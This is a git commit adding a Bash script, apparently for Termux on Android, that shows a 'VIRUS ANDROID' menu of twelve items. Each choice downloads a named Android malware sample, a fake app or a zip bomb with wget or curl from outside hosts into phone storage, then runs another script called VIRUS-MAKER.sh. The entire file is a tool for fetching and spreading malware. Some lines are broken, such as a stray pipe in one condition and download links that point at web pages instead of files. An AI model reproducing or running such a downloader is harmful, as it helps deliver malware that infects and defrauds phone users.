cf3a9e117df43faefb258f650444f3db2496a040
BURIQ2019 <50648774+BURIQ2019@users.noreply.github.com>
2019-08-03 17:12:50 +0700

    SFHS.sh

---
+++ SFHS.sh
@@ -0,0 +1,142 @@
+#!/bin/bash
+#version 1.0
+
+clear
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+echo " "
+echo " "
+echo " "
+echo " "
+figlet -f slant "VIRUS ANDROID" | lolcat
+echo "=======================================================" | lolcat
+echo " 01. ELITE.APK " | lolcat
+echo " 02. Bom Zip V.1" | lolcat
+echo " 03. Bom Zip V.2" | lolcat
+echo " 04. ADWARE.APK" | lolcat
+echo " 05. PULSA GRATIS.APK " | lolcat
+echo " 06. AGENT.APK"  | lolcat 
+echo " 07. BADWED.A.APK" | lolcat
+echo " 08. DROPDIALER.APK" | lolcat
+echo " 09. MUSIC.APK" | lolcat
+echo " 10. SETTING.APK" | lolcat
+echo " 11.FACEBOOK.APK" | lolcat
+echo " 12. ART STATION.APK" | lolcat
+echo "=======================================================" | lolcat
+echo $green "╭─[ Silahkan Di Pilih ]"
+read -p " ╰─# " pil
+
+
+
+if [ $pil = "1" ] || [ $pil = "01" ]
+then
+cd /storage/emulated/0
+wget http://gogr4m.tk/Virus/Elite.apk 
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "2" ] || [ $pil = "02" ]
+then
+cd /storage/emulated/0
+wget http://gogr4m.tk/Virus/Bom_zip.zip
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "3" ] || [ $pil = "03" ]
+then
+cd /storage/emulated/0
+wget http://gogr4m.tk/Virus/Bom_zip2.zip
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "4" ] || [ $pil = "04" ]
+then
+cd /storage/emulated/0
+curl -o Adware.apk https://raw.githubusercontent.com/Ractomes/Viruses/master/samples/Adware.apk
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "5" ] || [ $pil = "05" ]
+then
+cd /storage/emulated/0
+curl -o ApkPulsaGratis.apk https://github.com/TobzCyberTeam/Virus/blob/master/ApkPulsaGratis.apk
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "6" ] || [ $pil = "06" ]
+then
+cd /storage/emulated/0
+curl -o Agent.apk https://raw.githubusercontent.com/Ractomes/Viruses/master/samples/Agent.apk
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "7" ] || [ $pil = "07" ]
+then
+cd /storage/emulated/0
+curl -o Badnews.apk https://raw.githubusercontent.com/Ractomes/Viruses/master/samples/BadNews.A.apk
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "8" ] || [ $pil = "08" ]
+then
+cd /storage/emulated/0
+curl -o Dropdialer.apk https://raw.githubusercontent.com/Ractomes/Viruses/master/samples/Dropdialer.apk 
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "9" ] || [ $pil = "09" ]
+then
+cd /storage/emulated/0
+curl -o ApkPulsaGratis.apk https://github.com/TobzCyberTeam/Virus/blob/master/ApkPulsaGratis.apk
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "10" ] |
+then
+cd /storage/emulated/0
+curl -o Settings.apk https://raw.githubusercontent.com/Ractomes/Viruses/blob/master/samples/Settings.apk
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "11" ] 
+then
+cd /storage/emulated/0
+curl -o Facebook.apk https://raw.githubusercontent.com/Ractomes/Viruses/blob/master/samples/facebook.apk
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
+
+if [ $pil = "12" ] 
+then
+cd /storage/emulated/0
+curl -o ArtStation.apk https://raw.githubusercontent.com/Ractomes/Viruses/blob/master/samples/ArtStation.apk
+echo " [!] Download Success........" | lolcat
+echo " LIHAT DI PENYIMPAN...." | lolcat
+sh VIRUS-MAKER.sh
+fi
